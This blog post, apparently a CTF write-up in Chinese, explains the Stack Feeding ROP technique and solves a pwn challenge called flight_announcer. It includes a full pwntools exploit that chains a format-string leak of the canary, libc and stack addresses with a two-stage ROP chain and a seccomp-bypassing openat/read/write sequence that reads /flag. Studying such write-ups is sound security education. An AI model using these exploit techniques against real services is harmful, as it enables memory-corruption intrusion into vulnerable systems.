---
title: Pwn-Stack_Feeding
description: pwn第10部分学习Stack_Feedin
date: 2026-07-13 21:11:42
updated: 2026-07-13 21:11:42
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260713131713_1782038185436_compressed.jpeg
categories: [pwn]
tags: [Stack_Feeding, libc]
---

## Pwn-Stack Feeding

### 概念

Stack Feeding 是一种在**初始栈溢出空间极小**的情况下，利用程序中的输入函数（如 `read` syscall 或 `gets` 等），将后续真正的、长篇大论的 ROP 链，**动态地写入到当前栈指针（RSP）即将滑过的内存地址上**的技术。

它不依赖修改栈底指针（RBP），也不强行篡改 RSP 的大跳跃，而是利用了 `pop` 和 `ret` 指令会让 RSP **自然向高地址（栈底方向）滑动**的物理特性。

---

#### Stack Feeding 的经典执行三步曲

假设现在只能溢出极其有限的几个字节，刚刚好够放下一个 `read` syscall 的 Gadget：

**第一步：精准设置 `read` 的目标地址** 

构造的短 payload 会触发一次 `read` 调用。关键在于这个 `read` 要往哪里写数据？ 需要计算当前 `read` 执行时 RSP 的位置，然后把 `read` 的写入目标地址（通常是 RDI 寄存器控制的地址，或者 RSI 接收缓冲区的地址）设置在 **RSP 当前位置的下方（高地址处）**，比如 `RSP + 0x20`。

**第二步：执行“空投”（喂食）** 

`read` 函数开始等待输入。此时发送第二段极长的 Payload（包含完整的 SROP 帧或复杂的 ROP 链）。这段庞大的数据会被 `read` 精准地写到刚才设置的 `RSP + 0x20` 开始的内存带上。

**第三步：RSP 自然滑落，无缝衔接** `read` 执行完毕后返回（`ret`）。

此时程序正常的流程继续走RSP 随着后续的一两个 `ret` 指令自然往下移动。滑着滑着，RSP 就刚好走到了 `RSP + 0x20` 的位置，一脚踩进了你刚刚“喂”进去的新 ROP 链里，继续快乐地执行。

---

#### 优势点

**无视溢出长度限制**：只要你有几字节能触发一次 `read`，你就可以喂进成百上千字节的真实 Payload，实现“无限续杯”。

**完美对抗无 Leak 的 ASLR/PIE**：由于你写入的目标地址是基于当前栈的一个相对偏移（比如 `sub_rbp+0x30`），你根本不需要知道当前栈在内存中的绝对物理地址究竟是多少。不管系统怎么随机化，相对距离是不变的。

**对抗极简环境**：不需要费尽心机去找 `leave; ret` 或者 `pop rsp` 这种苛刻的 Gadget。

---

#### Stack Feeding 和 Stack Pivoting区别

| **比较维度**             | **Stack Feeding (常规填栈/直接溢出)**                        | **栈迁移 (Stack Pivoting)**                                  |
| ------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **核心机制**             | 直接利用溢出漏洞，在**当前栈空间**连续写入数据，覆盖返回地址并顺势布置完整的 ROP 链。 | 利用有限的溢出空间覆盖返回地址，通过执行特定的 Gadget **强行修改栈指针（ESP/RSP）**，将执行流导向另一块可控内存。 |
| **适用场景（触发条件）** | 存在栈溢出漏洞，且**溢出长度足够大**，能够容纳下攻击者构造的完整 Payload。 | 存在栈溢出漏洞，但**溢出长度极其受限**（例如只能多溢出 8 字节，仅够覆盖 EBP/RBP 和 EIP/RIP）。 |
| **目标栈区位置**         | 原有的线程栈区（Stack Segment）。                            | 其他内存区域，如 `.bss` 段（全局变量区）、Heap（堆区）或其他预先布置了数据的栈顶。 |
| **关键寄存器状态**       | `ESP` / `RSP` 随着 `ret` 指令的执行，继续在原始栈的地址范围内正常滑动。 | `ESP` / `RSP` 被瞬间劫持，指向一个完全不同的内存地址（伪造的栈顶）。 |
| **常用汇编指令/Gadget**  | 侧重于参数传递和函数调用，如 `pop rdi; ret`。                | 侧重于劫持栈顶，最经典的是 `leave; ret`，或者 `pop rsp; ret`、`xchg eax, esp; ret`。 |
| **利用复杂度**           | **较低**。只需计算好偏移量，按顺序构造 `Padding + 劫持地址 + ROP链` 即可。 | **较高**。需要进行“两次或多次控制”：先在目标区域伪造好栈帧和 Payload，再通过有限的栈溢出触发迁移。 |

|               | Stack Pivot (栈迁移)      | Stack Feeding (栈喂料) |
| ------------- | ------------------------- | ---------------------- |
| rsp 变化      | 跨区域跳转（跳到 BSS/堆） | 在同一栈内顺势下滑     |
| 关键 gadget   | pop_rsp / leave           | 不需要！靠 read 铺路   |
| 额外 ROP 空间 | 需要 2 qword 给 pivot     | 0 额外开销             |
| 对齐要求      | 无特殊要求                | 需要精确计算 offset    |
| 适用场景      | 溢出区任意大小            | 溢出区极紧时最优       |

---

## 2026钓鱼城杯Fligt_announcer

::alert{icon="tabler:files" color="\#FF5733" title="flight_announcer题目附件"}

题目链接:

::

---

这题是一题Stack Feeding题和沙箱OWR题目

### 0x01 题目信息

| 项目 | 内容                                                         |
| ---- | ------------------------------------------------------------ |
| 平台 | x86_64                                                       |
| 保护 | NX / PIE / Canary / Full RELRO                               |
| 沙箱 | seccomp: read(0), write(1), openat(257), close(3), exit(60), exit_group(231), sigreturn(15) |
| libc | Ubuntu GLIBC 2.35-0ubuntu3.13                                |
| 漏洞 | 格式化字符串 + 栈溢出                                        |
| 手法 | Format String Leak → Stack Feeding → ORW via syscall         |

使用checksec发现题目信息如下

```asm
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```
这题pie，canary开启。需要使用溢出找到canary的数据，同时不能使用常规的偏移使用函数

---

### 0x02 函数分析

#### 程序入口 main() ->PIE+0x01504 主函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_1269(a1, a2, a3);
  sub_13C8();
  return 0LL;
}
```

#### sub_1269() -> PIE+0x01269  CTF服务函数

把 stdin/stdout/stderr 全部设成无缓冲模式（CTF服务函数，不需要理会）

```c
unsigned __int64 sub_1269()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  return v1 - __readfsqword(0x28u);
}
```

#### sub_13C8() -> pie+0x013C8 漏洞函数

```c
unsigned __int64 sub_13C8()
{
  ssize_t v1; // [rsp+8h] [rbp-B8h]
  char v2[64]; // [rsp+10h] [rbp-B0h] BYREF
  char buf[104]; // [rsp+50h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+B8h] [rbp-8h] canary保护

  v4 = __readfsqword(0x28u);
  puts(s);//打印=== 航班广播终端 v1.4 ===
  puts(asc_2028); //打印请输入广播草稿：
  printf(format);  //打印草稿>
  v1 = read(0, buf, 0x58uLL);
  if ( v1 <= 0 )
    exit(0);
  buf[v1] = 0;
  printf(asc_204A); //打印[预览]
  printf(buf);//格式化字符串，打印buf内容
  puts(byte_2054);
  puts(asc_2058);//[审计] 正在加载广播安全策略...
  sub_12F5();
  puts(asc_2083);//[审计] 策略已生效。
  printf(asc_20A0);//推送至频道（授权令牌）：
  read(0, v2, 0x100uLL);
  puts(asc_20C8);//[错误] 授权令牌无效，广播已取消。
  return v4 - __readfsqword(0x28u);
}
```

#### sub_12F5() -> pie + 12F5 沙箱限制控制函数

```c
unsigned __int64 sub_12F5()
{
  unsigned __int64 i; // [rsp+0h] [rbp-40h]
  __int64 v2; // [rsp+8h] [rbp-38h]
  int v3[10]; // [rsp+10h] [rbp-30h]
  unsigned __int64 v4; // [rsp+38h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = seccomp_init(0LL);
  if ( !v2 )
    exit(1);
  v3[0] = 0;
  v3[1] = 1;
  v3[2] = 257;
  v3[3] = 3;
  v3[4] = 60;
  v3[5] = 231;
  v3[6] = 15;
  for ( i = 0LL; i <= 6; ++i )
    seccomp_rule_add(v2, 2147418112LL, (unsigned int)v3[i], 0LL);
  seccomp_load(v2);
  seccomp_release(v2);
  return v4 - __readfsqword(0x28u);
}
```

限制syscall调用号为0,1,257,3,60,231,15分别对应

| **系统调用号 (RAX)** | **函数名**         | **寄存器传参 (RDI, RSI, RDX, R10...)** | **在 PWN 中的常见利用场景**                                  |
| -------------------- | ------------------ | -------------------------------------- | ------------------------------------------------------------ |
| **0**                | `sys_read`         | `read(fd, buf, count)`                 | **读数据**。常用于往内存（如 bss 段）读入 ROP 链、`/bin/sh` 字符串，或者配合 fd 读取 `flag` 文件内容到内存中。 |
| **1**                | `sys_write`        | `write(fd, buf, count)`                | **写数据 / 泄露数据**。常用于将内存中的 `flag` 打印到屏幕（stdout, fd=1），或者泄露 libc 地址。 |
| **3**                | `sys_close`        | `close(fd)`                            | **关闭文件描述符**。偶尔用于关闭标准输入/输出，或者清理 fd 以绕过某些限制。 |
| **15**               | `sys_rt_sigreturn` | 无需常规传参（恢复 CPU 上下文）        | **SROP (Sigreturn Oriented Programming) 的核心**。触发后，内核会从栈上恢复所有寄存器的状态。攻击者可以通过伪造栈上的 Signal Frame 来一次性控制所有寄存器。 |
| **60**               | `sys_exit`         | `exit(status)`                         | **正常退出线程**。利用完成后平滑退出程序，避免触发崩溃报警（Core Dump）。 |
| **231**              | `sys_exit_group`   | `exit_group(status)`                   | **退出整个进程**（包括所有线程）。在很多静态编译的程序或者 glibc 内部，最终的退出经常调用这个而不是 60。 |
| **257**              | `sys_openat`       | `openat(dirfd, pathname, flags, mode)` | **打开文件**。这是 `sys_open`（调用号为 2）的进阶版。当沙箱（Seccomp）禁用了调用号为 2 的 `open` 时，通常用 `openat` 来绕过限制，打开 `flag` 文件。 |



函数运行流程main->sub_1269()->sub_13C8()->sub_12F5()->sub_13C8()-main()

---

### 0x03 栈帧布局

```c
                ┌─────────────────────┐
sub_rbp + 0x08  │  return address     │ ← ROP 从这里开始
sub_rbp         │  saved_rbp          │
sub_rbp - 0x08  │  canary             │
                │  buf0 (0x58)        │
sub_rbp - 0x70  │  ...                │
sub_rbp - 0xb0  │  buf1 (0x100)       │ ← 溢出从这里开始
                └─────────────────────┘
```

溢出可用空间：
  从 return_addr (sub_rbp+0x08) 到 buf1 末尾 (sub_rbp+0x50) = 0x50 - 0x08 = 0x48 字节 = 72 字节 = 9 qword

---

### 0x04 格式化字符串泄露

在sub_13C8发现printf格式化字符串漏洞，我们需要利用它去进行泄露关键信息

先构造test_payload去计算libc,save_rbp,return和canary这些关键的值

```python
from pwn import *

context(os = 'linux',arch = 'amd64')

r = process('./flight_announcer')
libc = ELF('./libc.so.6')
elf = ELF('./flight_announcer')

r.recvuntil(b'>')
payload = b'AAAA'+b'|%p'*0x56+b'\n'
r.send(payload)
r.interactive()

```

```asm
helloctfos@Hello-CTF:/mnt/e/钓鱼杯/flight_announcer_attachment$ python3 test.py
[+] Starting local process './flight_announcer': pid 603804
[*] '/mnt/e/钓鱼杯/flight_announcer_attachment/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/mnt/e/钓鱼杯/flight_announcer_attachment/flight_announcer'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
 [预览] AAAA|0x7fff0e03a9a0|(nil)|0x75d633314907|0x9|0x75d6335cb040|0x2|0x58|(nil)|(nil)|(nil)|0x75d63341b6a0|(nil)|0x75d63328e3f5|(nil)|0x75d63341b6a0|0x7c70257c41414141|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x257c70257c70257c|0x7c70257c70257c70|0x70257c70257c7025|0x64ab37219200|0x2
[审计] 正在加载广播安全策略...
[审计] 策略已生效。
推送至频道（授权令牌）：[错误] 授权令牌无效，广播已取消。
[*] Got EOF while reading in interactive
$
```

观察可以发现，在`%16$p`出现了`41414141`,ASCII对应就是`AAAA`，说明`%16$p`就是buf[0]起始

canary到buf[0]的距离是`0x70-0x8` 也就是`13个qword`距离，`%29$p`即为`canary`数据，由此推断出`save_rbp`是`%30$p`，`return`是`%31$p`

同时也发现了0x7多个高地址调用,ASLR 随机化只影响高位，低 12 位（后三位十六进制）永远是固定的。

常见的

```asm
# 1. _IO_2_1_stderr_    — 99% 存在, setvbuf 残留, 偏移 0x21b6a0
# 2. _IO_2_1_stdout_    — 99% 存在, puts/printf 残留, 偏移 0x21b780
# 3. __libc_start_main  — 100% 存在, call main 返回地址, 偏移 0x29d90
```

能确定`0x75d63341b6a0`这个就是`_IO_2_1_stderr_`函数，验证

```asm
helloctfos@Hello-CTF:/mnt/e/钓鱼杯/flight_announcer_attachment$ 
readelf -W -s ./libc.so.6 | awk '/FUNC|OBJECT/{print $2, $8}' | grep 'b6a0'

000000000021b6a0 _IO_2_1_stderr_@@GLIBC_2.2.5
```

之所以需要寻找 libc 函数，是因为程序开启了 PIE 保护，导致我们无法依赖固定的绝对地址进行函数调用。此外，主程序 `flight_announcer` 内可用的 ROP Gadget 严重匮乏，缺失了 `syscall; ret` 和 `pop rdx; ret` 等关键指令，无法仅靠程序自身完成利用链的构造。

同时这题存在沙箱seccomp,也不能直接使用常规的ROP和syscall去栈溢出获取shell，所以本题的思路就很明确了，通过Stack Feeding构造链子。

为什么不能使用栈迁移呢？
主要是卡在第二次read写入ROP严格卡死9个qword输入，BSS的栈迁移最少qword空间是10个，Stack Feeding是9个

| **比较项**          | **BSS 栈迁移**                 | **Stack Feeding** |
| ------------------- | ------------------------------ | ----------------- |
| **最少 qword**      | 10 (差 1 个)                   | 9 (刚好)          |
| **额外 pivot 指令** | 需要 `pop rsp` 或 `leave; ret` | 不需要            |
| **这道题可行吗**    | ❌                              | ✅                 |

----

### 0x05 第一部分的payload 

泄露libc，canary，save_rbp，return四个值

```python
from pwn import *

context(os = 'linux',arch = 'amd64')

r    = process('./flight_announcer')
libc = ELF('./libc.so.6')

#retrieve stack data
r.recvuntil(b'>')
payload_1 = b'|%11$p|%29$p|%30$p|%31$p' 
payload_1 = payload_1.ljust(0x58,b'\x00')
r.send(payload_1)

r.recvuntil(b']')
leak_line = r.recvuntil(b'\n',drop = True)
print(f'泄露行:{leak_line}')
parts           = leak_line.split(b'|')
libc_leak       = int(parts[1],16)
canary          = int(parts[2],16)
save_main_rbp   = int(parts[3],16)
pie_return 	    = int(parts[4],16)

print(f'canary:    {hex(canary)}')

r.recvuntil(b'\xef\xbc\x9a')
```

---



### 0x06 Gadget寻找

通过使用syscall_tools对`libc.so.6`文件发现如下ROP

![image-20260713155554601](https://img2024.cnblogs.com/blog/3726946/202607/3726946-20260713211032173-884037252.png)

```asm
pop_rdi         = libc_base + 0x2a3e5     # 5f c3  (pop rdi; ret)
pop_rsi         = libc_base + 0x2be51     # 5e c3  (pop rsi; ret)
pop_rax_rdx_rbx = libc_base + 0x904a8     # 58 5a 5b c3  (pop rax; pop rdx; pop rbx; ret)
syscall_ret     = libc_base + 0x91316     # 0f 05 c3  (syscall; ret)
ret_gadget      = libc_base + 0x29139     # c3  (ret)
```

---

### 0x07 save_rbp 误区

`%30$lx` 泄露的是 `[sub_13C8_rbp]` 位置**存的值**，即 `main` 函数的 rbp 地址。而 buf1、ROP 链等所有栈上计算用的基准是 **sub_13C8 自己的 rbp**。两者相差 **0x20**。本质上我们需要的就是save rbp当前的地址也就是sub_rbp当前指向的位置地址（即save_rbp当前地址），就好比如save_rbp是一个指针，指向的是main_rbp的这个数据。

```asm
泄漏出来的是值, 不是地址本身:
  save_rbp = [sub_13C8_rbp] = main 的 rbp 值 = 0x7fff...48

需要的基准:
  sub_13C8_rbp = save_rbp - 0x20 = 0x7fff...28

这 0x20 的构成:
  main 局部变量   0x10 字节
  call sub_13C8   0x08 字节 (返回地址)
  push rbp        0x08 字节
  ──────────────────────
  合计             0x20 字节
```

常见错误

```
# ❌ 直觉写法 — 拿泄露值直接当 rbp 用
buf1  = save_rbp - 0xb0         # 偏离 0x20
rop   = save_rbp + 0x08         # 偏离 0x20
stage2_target = save_rbp + 0x30 # 偏离 0x20

# ✅ 正确写法 — 先修正帧间距
sub_rbp = save_rbp - 0x20
buf1  = sub_rbp - 0xb0
rop   = sub_rbp + 0x08
stage2_target = sub_rbp + 0x30
```

后果

差 0x20 导致 Stage2 数据写到错误位置，`syscall_ret` 返回时 `ret` 跳到垃圾地址，直接 SIGSEGV。**泄露的是"相邻帧"的地址，不是"当前帧"的地址。** Stack Feeding 的对齐计算 (`0x50 - 0x30 = 0x20`) 恰好掩盖了这个偏移——但前提是基准必须对。

---

### 0x08 Stack Feeding — 核心手法

**问题**：只有 9 个 `qword`（72 字节），写不下完整的 ORW 链（需要约 27 `qword`、216 字节）。

**方案**：分两阶段。`Stage1` 用 9 `qword` 调用 `read(0, sub_rbp+0x30, 0x200)`，把真正的 ORW 链喂到栈下方。`syscall_ret` 执行后 rsp 自然走到 `sub_rbp+0x50`，恰好对齐刚喂入数据的 offset 0x20。

```asm
stage1 喂食:
   read 写到 sub_rbp + 0x30
            ↓
   sub_rbp + 0x30 ─→  ┌──────────────────┐ offset 0x00
                      │  \x00            │
   sub_rbp + 0x50 ─→  ├──────────────────┤ offset 0x20 ← syscall 后 ret 跳到这
                      │  ret_gadget      │
   sub_rbp + 0x58 ─→  ├──────────────────┤ offset 0x28 ← ORW 链从这里开始
                      │  pop_rax_rdx_rbx │
                      │  257             │
                      │  0               │
                      │  0               │
                      │  ...             │
                      ├──────────────────┤ offset 0x100
                      │  "/flag\x00"     │ ← flag 字符串
                      ├──────────────────┤ offset 0x200
                      │  (flag 缓冲区)    │ ← read/write 的数据
                      └──────────────────┘
```

```asm
rsi = sub_rbp + 0x30          ← read 写起点
rsp = sub_rbp + 0x50          ← syscall_ret 后 rsp 位置
offset = 0x50 - 0x30 = 0x20   ← ret 跳转在 stage2 中的偏移
```

---

### 0x09 ORW 链（绕过沙箱）

```c
沙箱允许: read(0), write(1), openat(257)
禁止: open(2), execve(59)

攻击链:
  openat(AT_FDCWD, "/flag", O_RDONLY) → fd = 3
  read(3, buf, 0x100)                  → 读 flag 内容
  write(1, buf, 0x100)                 → 输出到屏幕
```

每个 syscall 消耗 9 qword：

1. `pop_rax_rdx_rbx` (4) — 设 rax + rdx + rbx
2. `pop_rsi` (2) — 设 rsi
3. `pop_rdi` (2) — 设 rdi
4. `syscall_ret` (1) — 执行

3 个 syscall × 9 = 27 qword = 216 字节（因此无法放入 72 字节的溢出区，必须 Stack Feeding）

### 0x10 完整payload

```python
from pwn import *

context(os='linux', arch='amd64')

r    = process('./flight_announcer')
libc = ELF('./libc.so.6')

# ========== Step 1: 格式字符串泄露 ==========
r.recvuntil(b'>')
payload_1 = b'|%11$p|%29$p|%30$p|%31$p'
payload_1 = payload_1.ljust(0x58, b'\x00')
r.send(payload_1)

r.recvuntil(b']')
leak_line = r.recvuntil(b'\n', drop=True)
parts         = leak_line.split(b'|')
libc_leak     = int(parts[1], 16)   # _IO_2_1_stderr_
canary        = int(parts[2], 16)
save_main_rbp = int(parts[3], 16)   # main 的 rbp

libc_base = libc_leak - libc.symbols['_IO_2_1_stderr_']
sub_rbp   = save_main_rbp - 0x20    # sub_13C8 的 rbp

# Gadgets
pop_rdi         = libc_base + 0x2a3e5
pop_rsi         = libc_base + 0x2be51
pop_rax_rdx_rbx = libc_base + 0x904a8
syscall_ret     = libc_base + 0x91316
ret_gadget      = libc_base + 0x29139

# 消费第二个 prompt (全角冒号 UTF-8: \xef\xbc\x9a)
r.recvuntil(b'\xef\xbc\x9a')

# ========== Step 2: Stage1 — Stack Feeding ==========
# read(0, sub_rbp + 0x30, 0x200)
# 喂 0x200 字节到栈下方, syscall 后自然滑入

stage1_rop  = p64(pop_rdi) + p64(0)
stage1_rop += p64(pop_rsi) + p64(sub_rbp + 0x30)
stage1_rop += p64(pop_rax_rdx_rbx) + p64(0) + p64(0x200) + p64(0)
stage1_rop += p64(syscall_ret)   # ← 9 qword 刚好

payload_2  = b'a' * 0xa8
payload_2 += p64(canary)
payload_2 += p64(0)
payload_2 += stage1_rop

assert len(stage1_rop) == 9 * 8
assert len(payload_2)   == 0x100

r.send(payload_2)

# ========== Step 3: Stage2 — ORW 链 ==========
flag_str = sub_rbp + 0x30 + 0x100   # "/flag\x00" 位置
flag_buf = sub_rbp + 0x30 + 0x200   # flag 内容缓冲

stage2  = b'\x00' * 0x20                # 对齐至 offset 0x20
stage2 += p64(ret_gadget)               # ret 滑入

# openat(AT_FDCWD, flag_str, O_RDONLY)
stage2 += p64(pop_rax_rdx_rbx) + p64(257) + p64(0) + p64(0)
stage2 += p64(pop_rsi) + p64(flag_str)
stage2 += p64(pop_rdi) + p64(0xffffffffffffff9c)
stage2 += p64(syscall_ret)

# read(3, flag_buf, 0x100)
stage2 += p64(pop_rax_rdx_rbx) + p64(0) + p64(0x100) + p64(0)
stage2 += p64(pop_rsi) + p64(flag_buf)
stage2 += p64(pop_rdi) + p64(3)
stage2 += p64(syscall_ret)

# write(1, flag_buf, 0x100)
stage2 += p64(pop_rax_rdx_rbx) + p64(1) + p64(0x100) + p64(0)
stage2 += p64(pop_rsi) + p64(flag_buf)
stage2 += p64(pop_rdi) + p64(1)
stage2 += p64(syscall_ret)

# 填 padding + /flag string
stage2 += b'\x00' * (0x100 - len(stage2))
stage2 += b'/flag\x00'
stage2  = stage2.ljust(0x300, b'\x00')

sleep(0.5)
r.send(stage2)

r.interactive()
```

----

### 0x11 思路回顾

```c
┌──────────────────────────────────────────┐
│ 1. 格式串泄露                              │
│    %11$lx → libc_base                    │
│    %29$lx → canary                       │
│    %30$lx → sub_rbp = save_rbp - 0x20    │
│                                          │
│ 2. Stack Feeding (9 qword)               │
│    read(0, sub_rbp+0x30, 0x200)          │
│    → 把 ORW 链喂到 rsp 前进方向             │
│    → syscall_ret: rsp 自然滑入刚喂的数据    │
│                                          │
│ 3. ORW (绕过 seccomp)                     │
│    openat(-100, "/flag", 0) → fd=3       │
│    read(3, buf, 0x100)       → flag 内容  │
│    write(1, buf, 0x100)      → 打印 flag  │
└──────────────────────────────────────────┘
```